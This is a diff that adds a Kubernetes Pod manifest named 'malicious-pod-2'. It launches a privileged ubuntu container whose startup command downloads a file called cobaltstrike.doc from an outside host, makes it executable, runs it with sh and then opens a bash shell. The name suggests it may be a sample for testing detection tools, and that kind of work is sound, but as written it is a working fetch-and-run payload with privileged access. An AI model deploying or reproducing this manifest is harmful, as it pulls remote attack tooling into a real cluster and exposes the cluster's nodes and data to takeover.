@@ -1,0 +1,22 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: malicious-pod-2
+  labels:
+    app: malicious-2
+spec:
+  containers:
+  - name: ubuntu
+    image: ubuntu:latest
+    command: ["/bin/bash", "-c"]
+    args:
+      - |
+        apt-get update && \
+        apt-get install -y gcc wget && \
+        sleep 5 && \
+        cd /tmp && wget http://testlzp.lat/cobaltstrike.doc && \
+        chmod +x /tmp/cobaltstrike.doc && sh /tmp/cobaltstrike.doc && cat /tmp/cobaltstrike.doc && \
+        exec /bin/bash
+    securityContext:
+      privileged: true
+  restartPolicy: Never
